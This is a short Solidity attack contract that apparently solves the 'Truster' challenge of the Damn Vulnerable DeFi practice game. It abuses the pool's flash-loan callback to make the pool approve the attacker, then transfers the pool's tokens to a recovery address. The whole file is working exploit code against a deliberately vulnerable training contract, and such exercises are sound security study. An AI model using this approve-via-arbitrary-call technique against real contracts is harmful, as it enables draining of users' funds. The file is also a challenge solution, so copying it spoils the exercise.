import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {console} from "forge-std/Test.sol";

contract AttackContract {
    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _recovery,
        uint256 _amount
    ) {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this), // will bypass the vm.startPrank() and call it using address(this)
            _amount
        );
        _pool.flashLoan(0, address(this), address(_token), data); // try to approve AttackContract using
        console.log(_token.allowance(address(_pool), address(this)));
        _token.transferFrom(address(_pool), _recovery, _amount); //
    }
}